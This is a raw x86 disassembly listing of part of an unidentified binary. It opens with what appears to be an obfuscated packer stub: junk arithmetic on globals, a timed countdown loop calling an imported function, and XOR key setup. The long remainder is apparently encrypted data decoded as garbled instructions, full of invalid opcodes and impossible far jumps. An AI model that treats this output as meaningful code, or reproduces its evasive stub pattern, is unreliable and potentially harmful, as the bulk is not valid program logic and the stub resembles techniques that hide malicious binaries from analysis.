  401841:	jb     0x401833
  401843:	stos   DWORD PTR es:[edi],eax
  401844:	(bad)  
  401845:	adc    DWORD PTR [edi],esi
  401847:	jns    0x40181a
  401849:	pop    es
  40184a:	mov    DWORD PTR [ebp-0x20],eax
  40184d:	neg    DWORD PTR ds:0x430596
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e862,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430646,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430642,0x13
  401884:	cmp    DWORD PTR ds:0x430642,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430642,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eba4
  4018a9:	mov    ebx,DWORD PTR ds:0x430642
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430642,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e85e,0x42e862
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4305b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e86a,0x430642
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430652,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	fwait
  401915:	xlat   BYTE PTR ds:[ebx]
  401916:	(bad)  
  401917:	ret    0x7516
  40191a:	jle    0x40199a
  40191c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401920:	push   ss
  401921:	dec    eax
  401922:	cmp    DWORD PTR [ebx-0x1a],esi
  401925:	mov    eax,0x23c925f2
  40192a:	addr16 arpl dx,bx
  40192d:	outs   dx,BYTE PTR ds:[esi]
  40192e:	or     DWORD PTR [edx+ecx*2],0x7b
  401932:	jge    0x40197e
  401934:	add    eax,0x6f125bf7
  401939:	or     al,0x27
  40193b:	lahf   
  40193c:	xchg   BYTE PTR [edx+0x56],al
  40193f:	fimul  WORD PTR [ebx]
  401941:	sub    BYTE PTR ds:0x62283eab,ah
  401947:	pushf  
  401948:	test   BYTE PTR [ebx+0x2f],0x77
  40194c:	rol    DWORD PTR [esi],1
  40194e:	pop    eax
  40194f:	mov    bh,cl
  401951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401952:	gs mov dh,0x33
  401955:	dec    esp
  401956:	dec    esi
  401957:	cmp    esi,ebp
  401959:	addr16 fld st(4)
  40195c:	cld    
  40195d:	unpckhps xmm5,XMMWORD PTR [ebx+esi*4]
  401961:	push   es
  401962:	loopne 0x4019a3
  401964:	dec    edx
  401965:	das    
  401966:	(bad)  
  401968:	push   ds
  401969:	int    0x7a
  40196b:	jae    0x4019af
  40196d:	sub    eax,0x5053cd88
  401972:	test   DWORD PTR [edi-0x7c3237e6],0x7c40dd55
  40197c:	jmp    0x4a0cef87
  401981:	in     eax,dx
  401982:	popf   
  401983:	sub    DWORD PTR [edx-0x68],edi
  401986:	inc    eax
  401987:	jns    0x4019d5
  401989:	aas    
  40198a:	cmp    DWORD PTR [esi],0x9
  40198d:	jg     0x4019ee
  40198f:	cmp    eax,0x40b1cc07
  401994:	add    DWORD PTR [ebx+0x1902c03b],esp
  40199a:	jge    0x40191f
  40199c:	lock and esi,ebx
  40199f:	mov    WORD PTR [ebx-0x45],gs
  4019a2:	mov    ?,WORD PTR [esi+0x2ba54ca0]
  4019a8:	push   0xc
  4019aa:	imul   ecx,DWORD PTR [ebx+0x4a],0x65ead1c3
  4019b1:	test   BYTE PTR [eax+0xe604db1],bh
  4019b7:	adc    al,0x64
  4019b9:	push   0xc9b5862b
  4019be:	push   es
  4019bf:	inc    ebx
  4019c0:	jecxz  0x4019ab
  4019c2:	jae    0x401a2a
  4019c4:	push   0x1a
  4019c6:	pop    esp
  4019c7:	pusha  
  4019c8:	cs mov ch,0xed
  4019cb:	lods   eax,DWORD PTR ds:[esi]
  4019cc:	pop    edi
  4019cd:	fmulp  st(0),st
  4019cf:	xor    al,0xb9
  4019d1:	cs out dx,al
  4019d3:	rcl    BYTE PTR [ebx+0x36524099],0x9
  4019da:	call   0x457b:0x5e070663
  4019e1:	jbe    0x401a39
  4019e3:	pop    ebp
  4019e4:	xor    BYTE PTR [ebp-0x1c],al
  4019e7:	lods   al,BYTE PTR ds:[esi]
  4019e8:	xchg   esp,eax
  4019e9:	(bad)
  4019ed:	dec    edx
  4019ee:	loop   0x401a1d
  4019f0:	outs   dx,BYTE PTR ds:[esi]
  4019f1:	fstp   st(2)
  4019f3:	jns    0x401a3a
  4019f5:	or     eax,0x90ec33f1
  4019fa:	pop    di
  4019fc:	pop    esp
  4019fd:	icebp  
  4019fe:	mov    edi,0x5417cd3f
  401a03:	mov    ah,0x1d
  401a05:	sar    BYTE PTR [ecx+ebp*4],1
  401a08:	outs   dx,DWORD PTR ds:[esi]
  401a09:	mov    al,0x80
  401a0b:	mov    DWORD PTR [esi-0x61ef42c],edx
  401a11:	into   
  401a12:	and    al,0xfc
  401a14:	cmovno edi,DWORD PTR [ebx]
  401a17:	pop    edx
  401a18:	cmp    al,0xe0
  401a1a:	inc    esi
  401a1b:	xchg   esi,eax
  401a1c:	retf   0x5f6
  401a1f:	mov    eax,0x5840e26f
  401a24:	add    eax,0xff29457a
  401a29:	(bad)  
  401a2a:	jle    0x401a22
  401a2c:	dec    edi
  401a2d:	and    al,0x63
  401a2f:	mov    cl,0x7f
  401a31:	add    al,0x9
  401a33:	call   0x2d87:0x6e12dd00
  401a3a:	loopne 0x401aa5
  401a3c:	and    BYTE PTR [eax-0x575b954b],dl
  401a42:	ret    
  401a43:	iret   
  401a44:	repnz sbb DWORD PTR [edx],0xffffffc5
  401a48:	jbe    0x401aab
  401a4a:	add    dh,BYTE PTR [ecx]
  401a4c:	or     bh,al
  401a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a4f:	cld    
  401a50:	pop    ds
  401a51:	ret    
  401a52:	retf   0xa047
  401a55:	or     BYTE PTR [eax-0x41e62bd1],ch
  401a5b:	addr16 retf 0x15bb
  401a5f:	inc    edx
  401a60:	loopne 0x401aba
  401a62:	stc    
  401a63:	inc    esp
  401a64:	add    edi,DWORD PTR [esi]
  401a66:	test   DWORD PTR [eax+0x5a],esp
  401a69:	xor    eax,0x3cad4a9d
  401a6e:	jae    0x401ad5
  401a70:	je     0x401a2f
  401a72:	pop    ebp
  401a73:	jle    0x401af4
  401a75:	into   
  401a76:	sub    esi,DWORD PTR [esi-0x4e]
  401a79:	push   DWORD PTR [eax]
  401a7b:	fwait
  401a7c:	and    ch,BYTE PTR [ebx-0x17]
  401a7f:	lahf   
  401a80:	dec    eax
  401a81:	imul   ebp,esp,0xffffffeb
  401a84:	adc    dl,BYTE PTR [ecx+edi*4+0x577e6334]
  401a8b:	adc    esi,ebx
  401a8d:	jmp    0x3f130fe0
  401a92:	pop    edx
  401a93:	icebp  
  401a94:	mov    esi,0x68723873
  401a99:	jg     0x401a6a
  401a9b:	pop    ss
  401a9c:	lahf   
  401a9d:	div    BYTE PTR [edi-0x436a3797]
  401aa3:	and    DWORD PTR [ebx],edx
  401aa5:	mov    ebp,0xd4bec8c9
  401aaa:	jmp    0x5ca7:0xc4fda528
  401ab1:	pop    esp
  401ab2:	or     eax,0x3dc96849
  401ab7:	or     al,0x42
  401ab9:	retf   0xabad
  401abc:	leave  
  401abd:	push   ds
  401abe:	inc    edi
  401abf:	repnz or bl,BYTE PTR [ecx-0x33288733]
  401ac6:	xchg   ah,bh
  401ac8:	pusha  
  401ac9:	and    al,0x25
  401acb:	out    0xc,al
  401acd:	adc    cl,ch
  401acf:	pop    eax
  401ad0:	mov    eax,0x4e5ee540
  401ad5:	sub    BYTE PTR [ebx+0x38bd7e9d],bh
  401adb:	and    eax,0xc74ff2d8
  401ae0:	xchg   ecx,eax
  401ae1:	cdq    
  401ae2:	pop    edi
  401ae3:	sbb    al,0xce
  401ae5:	in     eax,dx
  401ae6:	rol    esi,0xe7
  401ae9:	ins    DWORD PTR es:[edi],dx
  401aea:	add    BYTE PTR [edi-0x72],0xd9
  401aee:	mov    eax,ds:0xc888e798
  401af3:	mov    BYTE PTR [ebx+0x6e08ad57],ch
  401af9:	add    dh,BYTE PTR [edi]
  401afb:	xor    cl,0xb0
  401afe:	sbb    eax,0xfaa346cc
  401b03:	push   ebp
  401b04:	push   edx
  401b05:	sbb    BYTE PTR [ebp-0x70],0x51
  401b09:	dec    ebp
  401b0a:	mov    bh,0xbd
  401b0c:	cmc    
  401b0d:	in     eax,0xca
  401b0f:	outs   dx,BYTE PTR ds:[esi]
  401b10:	test   eax,0xdd27fa6
  401b15:	or     edx,DWORD PTR [ebp+esi*1+0x33]
  401b19:	js     0x401aaa
  401b1b:	xlat   BYTE PTR ds:[ebx]
  401b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b1d:	jbe    0x401b75
  401b1f:	and    eax,DWORD PTR [edi-0x15]
  401b22:	fimul  WORD PTR [edi]
  401b24:	pushf  
  401b25:	xchg   ebp,eax
  401b26:	xchg   ebp,eax
  401b27:	jne    0x401ba0
  401b29:	sahf   
  401b2a:	(bad)  
  401b2b:	hlt    
  401b2c:	cmp    ebp,DWORD PTR [edx+0x1c]
  401b2f:	mov    bh,0xeb
  401b31:	int    0xdd
  401b33:	jmp    0x401ac2
  401b35:	and    cl,BYTE PTR [esi+edx*2-0x5]
  401b39:	(bad)  
  401b3a:	in     al,dx
  401b3b:	inc    ebp
  401b3c:	adc    DWORD PTR [ebp+0x562c45fe],edi
  401b42:	call   0xd0e2:0x931e258b
  401b49:	stc    
  401b4a:	add    DWORD PTR [eax+0x6b],ecx
  401b4d:	test   eax,0x9a74a655
  401b52:	daa    
  401b53:	or     al,al
  401b55:	fs in  eax,dx
  401b57:	push   es
  401b58:	add    DWORD PTR [ebp+0x48],ecx
  401b5b:	push   ss
  401b5c:	sub    BYTE PTR [ecx+0xf299568],dl
  401b62:	push   es
  401b63:	ss cli 
  401b65:	mov    edi,0x7e913715
  401b6a:	mov    ebx,0xbdfe503d
  401b6f:	jnp    0x401b16
  401b71:	push   0x39
  401b73:	adc    al,0x6b
  401b75:	xor    BYTE PTR [ecx+0x3a0c1423],bl
  401b7b:	or     cl,bh
  401b7d:	adc    cl,ah
  401b7f:	or     ah,BYTE PTR [edi-0x423005a5]
  401b85:	and    DWORD PTR [ebp-0x963a58f],esp
  401b8b:	sub    bh,cl
  401b8d:	push   ds
  401b8e:	jp     0x401b24
  401b90:	push   esi
  401b91:	ficom  WORD PTR [edi]
  401b93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b95:	and    al,0xce
  401b97:	fild   DWORD PTR [ebx]
  401b99:	lods   al,BYTE PTR ds:[esi]
  401b9a:	ins    BYTE PTR es:[edi],dx
  401b9b:	jl     0x401bd9
  401b9d:	xor    ch,BYTE PTR [ecx+0x2a]
  401ba0:	adc    DWORD PTR [ecx-0x26a1d048],ebp
  401ba6:	xchg   ecx,eax
  401ba7:	push   es
  401ba8:	and    DWORD PTR [edi+0x26141fff],ecx
  401bae:	or     eax,0xe85e91b3
  401bb3:	lods   eax,DWORD PTR ds:[esi]
  401bb4:	push   0x1c
  401bb6:	mov    ebp,0x5b1708aa
  401bbb:	adc    eax,0xc3cd3905
  401bc0:	add    esi,DWORD PTR [esi+0x5a989200]
  401bc6:	add    edx,DWORD PTR ds:0x8c516fa6
  401bcc:	outs   dx,DWORD PTR ds:[esi]
  401bcd:	adc    dl,cl
  401bcf:	bnd je 0x401b67
  401bd2:	xchg   edx,eax
  401bd3:	inc    esi
  401bd4:	shl    ah,1
  401bd6:	test   al,0x48
  401bd8:	sahf   
  401bd9:	mov    esp,0xb506319d
  401bde:	adc    BYTE PTR [ecx],dh
  401be0:	lea    eax,[esi-0xe3dd871]
  401be6:	jmp    0xb2430820
  401beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bec:	mov    esi,0xa93f9629
  401bf1:	out    0x7b,eax
  401bf3:	mov    BYTE PTR [ebp+0x55624ffa],al
  401bf9:	dec    edi
  401bfa:	fidiv  DWORD PTR [edi]
  401bfc:	test   al,0x8f
  401bfe:	(bad)  
  401bff:	add    DWORD PTR [bp-0x22],ebp
  401c03:	(bad)  
  401c04:	mov    DWORD PTR [ecx],edx
  401c06:	stc    
  401c07:	dec    esi
  401c08:	add    esp,ebx
  401c0a:	icebp  
  401c0b:	push   edx
  401c0c:	mov    edi,0x39f55bd8
  401c11:	lods   eax,DWORD PTR ds:[esi]
  401c12:	sbb    al,0xf4
  401c14:	dec    ebx
  401c15:	add    bh,BYTE PTR [esp+edx*1+0x53ea0c3d]
  401c1c:	push   ds
  401c1d:	data16 stc 
  401c1f:	fimul  DWORD PTR [ebx+ebp*8]
  401c22:	dec    eax
  401c23:	js     0x401bb6
  401c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c26:	ret    0x931c
  401c29:	pop    ebp
  401c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c2b:	inc    ebx
  401c2c:	cmp    BYTE PTR [ebp-0x57],al
  401c2f:	ja     0x401bca
  401c31:	mov    ebx,0x7d4ccc1c
  401c36:	push   ecx
  401c37:	jnp    0x401bb9
  401c39:	push   ds
  401c3a:	inc    BYTE PTR [ebx-0x2f3b55b8]
  401c40:	and    BYTE PTR ds:[eax+0x6e],dl
  401c44:	mov    al,gs:0xdd8ba76
  401c4a:	inc    esi
  401c4b:	push   ebx
  401c4c:	sub    DWORD PTR [ecx],eax
  401c4e:	mov    bl,0x77
  401c50:	sub    DWORD PTR [ecx+0x18dcab69],edx
  401c56:	xor    al,0xd5
  401c58:	cli    
  401c59:	test   DWORD PTR [edx],ebp
  401c5b:	cwde   
  401c5c:	fisub  WORD PTR [ecx-0x57c3b700]
  401c62:	mov    edi,0xf566a07d
  401c67:	push   es
  401c68:	enter  0xaa53,0x6
  401c6c:	push   esp
  401c6d:	or     cl,BYTE PTR [eax+0x2d44e761]
  401c73:	dec    ecx
  401c74:	jmp    0x54439f9e
  401c79:	or     esp,DWORD PTR [ebx-0x1bfef69e]
  401c7f:	mov    bh,dh
  401c81:	mov    edi,0x20d32d62
  401c86:	pop    ebx
  401c87:	dec    ebx
  401c88:	push   ebx
  401c89:	xor    eax,0xf950f713
  401c8f:	je     0x401ca6
  401c91:	mov    al,ds:0xac01f8b9
  401c96:	push   cs
  401c97:	test   al,0x4a
  401c99:	jae    0x401c61
  401c9b:	ror    cl,0xa0
  401c9e:	xor    BYTE PTR [eax-0x68e62e00],cl
  401ca4:	cld    
  401ca5:	inc    ebx
  401ca6:	fs dec edi
  401ca8:	call   0xf578:0x1359820b
  401caf:	or     edx,DWORD PTR [esi+ebx*4-0xb]
  401cb3:	or     bh,dh
  401cb5:	xrelease mov DWORD PTR ds:0x42ef20,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401cbe
  401cd2:	jmp    0x8fa2ee7
  401cd7:	jle    0x401d57
  401cd9:	xor    BYTE PTR [ecx+0x7e],0x7e
  401cdd:	mov    ah,0xcb
  401cdf:	dec    edi
  401ce0:	rol    bh,0x47
  401ce3:	push   es
  401ce4:	lods   eax,DWORD PTR ds:[esi]
  401ce5:	xchg   edx,eax
  401ce6:	push   ebx
  401ce7:	jmp    0x4289:0xfc59336f
  401cee:	and    bh,BYTE PTR [edi+edi*4-0x1c4b7ed6]
  401cf5:	pop    ebx
  401cf6:	nop
  401cf7:	and    ebx,DWORD PTR [edx+ecx*4-0x8]
  401cfb:	dec    esp
  401cfc:	pop    edx
  401cfd:	cmp    DWORD PTR [ebx+0x6faab7c4],edi
  401d03:	dec    ebx
  401d04:	sti    
  401d05:	fs gs clc 
  401d08:	test   DWORD PTR [ebp-0x7b],edi
  401d0b:	(bad)  
  401d0c:	cmp    al,0xeb
  401d0e:	sbb    eax,0x101b8d37
  401d13:	jns    0x401d42
  401d15:	ins    BYTE PTR es:[edi],dx
  401d16:	jle    0x401d7f
  401d18:	(bad)  
  401d19:	cld    
  401d1a:	mov    ebx,0xc4d3b9d
  401d1f:	pop    ebx
  401d20:	mov    al,ds:0xc427438e
  401d25:	sub    ch,BYTE PTR ds:0x3fb933fe
  401d2b:	mov    ecx,0xafbc0661
  401d30:	pushf  
  401d31:	mov    WORD PTR [ebx+0x44],?
  401d34:	ficomp DWORD PTR [ebp-0x5e]
  401d37:	jl     0x401cc8
  401d39:	sub    BYTE PTR [ebx+0x53],bl
  401d3c:	std    
  401d3d:	push   ds
  401d3e:	push   esp
  401d3f:	xchg   ecx,eax
  401d40:	dec    ebp
  401d41:	xchg   ebp,eax
  401d42:	pop    edi
  401d43:	or     al,0x95
  401d45:	ret    0x827a
  401d48:	rcr    DWORD PTR [bx+si+0x261c],1
  401d4d:	mov    eax,ds:0x5b90532a
  401d52:	popf   
  401d53:	(bad)  
  401d54:	imul   esp,DWORD PTR [ebx+esi*8-0x1f],0xdfbdafb3
  401d5c:	aas    
  401d5d:	popf   
  401d5e:	push   0xd3b25f05
  401d63:	inc    ebx
  401d64:	idiv   DWORD PTR [ebx+0xb527d64]
  401d6a:	lds    esi,FWORD PTR [ebp-0x1736da1a]
  401d70:	or     BYTE PTR [edi+edx*4],cl
  401d73:	clc    
  401d74:	neg    BYTE PTR [edi-0x2ecaf3c]
  401d7a:	les    ecx,FWORD PTR ds:0x9d57b94b
  401d80:	test   al,0xaa
  401d82:	(bad)
  401d86:	data16 std 
  401d88:	sub    eax,esp
  401d8a:	cmp    BYTE PTR [ecx+ebx*1-0x7e924b3e],al
  401d91:	sbb    ebp,DWORD PTR [edi+0x232d43cc]
  401d97:	std    
  401d98:	daa    
  401d99:	adc    al,0x23
  401d9b:	sub    BYTE PTR [ecx],dh
  401d9d:	out    0xac,eax
  401d9f:	stos   DWORD PTR es:[edi],eax
  401da0:	and    al,0x2e
  401da2:	inc    esp
  401da3:	sbb    eax,0x167c4f30
  401da8:	into   
  401da9:	mov    ch,al
  401dab:	in     al,0x78
  401dad:	and    ebx,ecx
  401daf:	cmp    al,0xe9
  401db1:	dec    esp
  401db2:	hlt    
  401db3:	bound  edi,QWORD PTR [esi]
  401db5:	jl     0x401da0
  401db7:	sub    ebp,DWORD PTR [ebp+0x59a66629]
  401dbd:	jmp    0xdcdc:0x13e77286
  401dc4:	(bad)  
  401dc5:	fwait
  401dc6:	stc    
  401dc7:	sbb    edx,DWORD PTR [bp+0x1f5b]
  401dcc:	pop    es
  401dcd:	push   edi
  401dce:	nop
  401dcf:	(bad)  
  401dd0:	mov    ecx,0x8debc120
  401dd5:	inc    edi
  401dd6:	pop    ds
  401dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd8:	ret    0xac1b
  401ddb:	mov    al,ds:0xb7002de3
  401de0:	sbb    bl,bl
  401de2:	(bad)  
  401de3:	pop    esi
  401de4:	out    dx,al
  401de5:	in     al,0x19
  401de7:	or     eax,edi
  401de9:	xlat   BYTE PTR ds:[ebx]
  401dea:	cmp    eax,0x592f12cf
  401def:	lods   eax,DWORD PTR ds:[esi]
  401df0:	mov    dl,0xc0
  401df2:	mov    edx,0x3aefc36e
  401df7:	fbstp  TBYTE PTR [ebx-0x3c3d12e3]
  401dfd:	cmp    DWORD PTR [esi-0x2b294ead],ecx
  401e03:	dec    esi
  401e04:	sub    bl,ch
  401e06:	xchg   esp,eax
  401e07:	imul   DWORD PTR [ecx+0x1]
  401e0a:	nop
  401e0b:	shr    DWORD PTR [eax+0x717979cb],0x2c
  401e12:	pop    esi
  401e13:	mov    es,WORD PTR [ecx+eiz*8]
  401e16:	xor    BYTE PTR [ebp+0x7],0xea
  401e1a:	push   ss
  401e1b:	(bad)  
  401e1d:	sub    DWORD PTR [esi+0x0],ecx
  401e20:	dec    ecx
  401e21:	ja     0x401de4
  401e23:	jg     0x401e7e
  401e25:	ds (bad) 
  401e27:	push   ebp
  401e28:	outs   dx,DWORD PTR ds:[esi]
  401e29:	or     ch,0x66
  401e2c:	push   ebp
  401e2d:	shl    dh,cl
  401e2f:	ret    0xde4d
  401e32:	jmp    0x8c5eb95
  401e37:	mov    bh,0x3a
  401e39:	cmp    edx,DWORD PTR [ebx+0x3e3c2946]
  401e3f:	lods   al,BYTE PTR ds:[esi]
  401e40:	aam    0xcd
  401e42:	sbb    DWORD PTR [edi],ebx
  401e44:	popa   
  401e45:	in     eax,dx
  401e46:	fsubr  QWORD PTR [eax-0x927930e]
  401e4c:	(bad)  
  401e4d:	jmp    0x401ec1
  401e4f:	mov    bh,0x66
  401e51:	sub    edi,eax
  401e53:	test   eax,0x923550db
  401e58:	imul   ebp,DWORD PTR [ecx-0xd564378],0xa93f3ec0
  401e62:	clc    
  401e63:	add    ebx,edx
  401e65:	hlt    
  401e66:	test   DWORD PTR [edi+0x44300f50],ecx
  401e6c:	stos   DWORD PTR es:[edi],eax
  401e6d:	dec    eax
  401e6e:	push   edx
  401e6f:	test   eax,0x40127659
  401e74:	out    dx,eax
  401e75:	sahf   
  401e76:	dec    ebp
  401e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e78:	mov    ds:0x6260a2d4,al
  401e7d:	les    edi,FWORD PTR [bp+si+0xb]
  401e81:	pop    esi
  401e82:	push   0x27
  401e84:	add    al,0xae
  401e86:	hlt    
  401e87:	dec    edi
  401e88:	inc    ecx
  401e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8a:	mov    bh,0x40
  401e8c:	xlat   BYTE PTR ds:[ebx]
  401e8d:	es cld 
  401e8f:	jmp    0x1cee0095
  401e94:	adc    DWORD PTR [ecx-0x37],esi
  401e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e98:	test   al,0xd7
  401e9a:	fdiv   QWORD PTR [edx+0x69]
  401e9d:	cmp    al,0xe8
  401e9f:	call   0x5e8:0xfcd1ef69
  401ea6:	xor    cl,BYTE PTR [eax+edx*8-0x6393e9a4]
  401ead:	aaa    
  401eae:	or     DWORD PTR [ebx],ebx
  401eb0:	jle    0x401e60
  401eb2:	mov    bh,0xdc
  401eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb5:	xchg   esp,eax
  401eb6:	pop    ds
  401eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eb8:	sahf   
  401eb9:	or     ah,BYTE PTR [ebp+0x78]
  401ebc:	test   eax,0x6e5188bd
  401ec1:	xchg   esi,eax
  401ec2:	push   cs
  401ec3:	daa    
  401ec4:	ins    DWORD PTR es:[edi],dx
  401ec5:	in     eax,0xa1
  401ec7:	xor    al,0xc9
  401ec9:	ins    BYTE PTR es:[edi],dx
  401eca:	xor    DWORD PTR [ebp+esi*8+0x7d],0xffffffef
  401ecf:	in     eax,0x33
  401ed1:	pushf  
  401ed2:	mov    ecx,0x913f6949
  401ed7:	inc    edi
  401ed8:	outs   dx,BYTE PTR ds:[esi]
  401ed9:	stos   DWORD PTR es:[edi],eax
  401eda:	jae    0x401eeb
  401edc:	(bad)  
  401edd:	sti    
  401ede:	cwde   
  401edf:	mov    cl,0x3c
  401ee1:	dec    esp
  401ee2:	das    
  401ee3:	inc    eax
  401ee4:	mov    dh,0xe6
  401ee6:	sbb    al,0x19
  401ee8:	sbb    bl,dl
  401eea:	sbb    ebp,ecx
  401eec:	push   0x495608c4
  401ef1:	sub    dh,BYTE PTR [edx-0x2b68e96e]
  401ef7:	(bad)
  401efa:	pop    eax
  401efb:	daa    
  401efc:	imul   ecx,DWORD PTR [ecx],0xffffffeb
  401eff:	outs   dx,DWORD PTR ds:[esi]
  401f00:	loopne 0x401e8d
  401f02:	jmp    DWORD PTR [eax-0x61]
  401f05:	mov    ds:0x865fabee,al
  401f0a:	mov    BYTE PTR [ebx],al
  401f0c:	mov    ebp,eax
  401f0e:	sub    ch,bh
  401f10:	mov    dh,0x6b
  401f12:	or     edi,eax
  401f14:	pop    eax
  401f15:	aad    0x64
  401f17:	aaa    
  401f18:	ss mov cl,0xc4
  401f1b:	adc    DWORD PTR [edx+0x4d],0xffffffc7
  401f1f:	cdq    
  401f20:	sub    al,BYTE PTR [edi]
  401f22:	popf   
  401f23:	jns    0x401f07
  401f25:	jge    0x401f43
  401f27:	cmp    eax,0x6514f047
  401f2c:	mov    eax,0xab6a773c
  401f31:	sahf   
  401f32:	or     eax,0xe0fb3b4
  401f37:	shr    BYTE PTR [ebx-0x5c60cd30],cl
  401f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3e:	cmp    al,BYTE PTR [ebx]
  401f40:	jno    0x401f9f
  401f42:	xor    DWORD PTR [ecx-0x76e2c3ba],edi
  401f48:	dec    esp
  401f49:	jbe    0x401eef
  401f4b:	mov    bl,BYTE PTR [ecx+0x1c]
  401f4e:	aaa    
  401f4f:	clc    
  401f50:	sbb    BYTE PTR [esi+0x43adf8a9],dh
  401f56:	xor    BYTE PTR [ebp+0x25694fb4],ah
  401f5c:	out    0x57,al
  401f5e:	adc    eax,0xdb296a14
  401f63:	or     eax,0x448747af
  401f68:	dec    esp
  401f69:	cmp    DWORD PTR [esi+0x7f],ebp
  401f6c:	into   
  401f6d:	inc    ebx
  401f6e:	cli    
  401f6f:	add    al,BYTE PTR [ebx+0x43]
  401f72:	sbb    eax,0x44389f8
  401f77:	push   ss
  401f78:	les    esp,FWORD PTR [eax-0x7ad27d20]
  401f7e:	or     DWORD PTR [edx-0x6d48ff32],0x41
  401f85:	sub    eax,0xa183100c
  401f8a:	imul   ebx,DWORD PTR [ebx+0x78c1443],0x472890c6
  401f94:	and    DWORD PTR [eax-0x6d],edi
  401f97:	xchg   ecx,eax
  401f98:	stc    
  401f99:	xchg   esp,eax
  401f9a:	call   DWORD PTR [ecx-0x41]
  401f9d:	adc    eax,0x47673e9e
  401fa2:	push   ss
  401fa3:	stos   BYTE PTR es:[edi],al
  401fa4:	or     esp,DWORD PTR [eax]
  401fa6:	enter  0xbf67,0xcc
  401faa:	and    dh,ah
  401fac:	out    0x98,eax
  401fae:	call   0x5d38:0xbba1619d
  401fb5:	jb     0x401fe6
  401fb7:	mov    gs,WORD PTR [edx]
  401fb9:	jmp    0x410:0x2f208241
  401fc0:	lds    edx,FWORD PTR [esi-0x59ae84e2]
  401fc6:	int3   
  401fc7:	inc    dl
  401fc9:	gs or  eax,0x8dd9bd6e
  401fcf:	call   0x81ab:0xeefd97f1
  401fd6:	xor    DWORD PTR [esp+edi*1],ecx
  401fd9:	mov    dl,0x3a
  401fdb:	mov    eax,DWORD PTR [esi]
  401fdd:	mov    edi,0x7cd270f3
  401fe2:	lahf   
  401fe3:	cmp    ebx,DWORD PTR [edi]
  401fe5:	mov    dh,0x48
  401fe7:	lods   al,BYTE PTR ds:[esi]
  401fe8:	popa   
  401fe9:	adc    cl,BYTE PTR [ebx+0x3ab31a98]
  401fef:	or     edx,DWORD PTR [eax+0x15]
  401ff2:	or     al,0x2f
  401ff4:	push   0x28
  401ff6:	push   edx
  401ff7:	(bad)  
  401ff8:	jmp    DWORD PTR [eax+0x542d5990]
  401ffe:	es not esi
  402001:	push   ebx
  402002:	add    eax,0x29b776dd
  402007:	fwait
  402008:	daa    
  402009:	and    eax,0xb9b36c1e
  40200e:	and    ebx,DWORD PTR [edx+eiz*4]
  402011:	xchg   DWORD PTR [esi+0x42],ebx
  402014:	ret    0x292e
  402017:	scas   eax,DWORD PTR es:[edi]
  402018:	fsub   QWORD PTR [ebx]
  40201a:	pop    edx
  40201b:	rcr    DWORD PTR [ecx+0x6203ea72],0xe5
  402022:	repnz fist DWORD PTR [edx+0x3ba7c70e]
  402029:	mov    ds:0xac1356ef,eax
  40202e:	dec    esi
  40202f:	inc    edx
  402030:	gs out dx,eax
  402032:	retf   0xa2ab
  402035:	fs addr16 (bad) 
  402038:	fwait
  402039:	jg     0x402092
  40203b:	(bad)  
  40203c:	mov    eax,0x689cd788
  402041:	add    DWORD PTR [edx+0x65],0x8ef692fc
  402048:	sub    eax,0x62a3211d
  40204d:	dec    edi
  40204e:	adc    cl,BYTE PTR [edx-0x80]
  402051:	loope  0x40203c
  402053:	data16 adc al,0xda
  402056:	mov    dl,0x93
  402058:	dec    esi
  402059:	cmp    esi,DWORD PTR [edx+ebp*4]
  40205c:	inc    edx
  40205d:	dec    ebp
  40205e:	cmp    al,0xa1
  402060:	sar    BYTE PTR [ecx+0x1500d4d3],0xd0
  402067:	or     ah,cl
  402069:	into   
  40206a:	lods   al,BYTE PTR ds:[esi]
  40206b:	clc    
  40206c:	in     eax,0x9c
  40206e:	(bad)  
  40206f:	fadd   DWORD PTR [ebx+ecx*4+0x55]
  402073:	loopne 0x40203c
  402075:	inc    ebp
  402076:	aam    0xb9
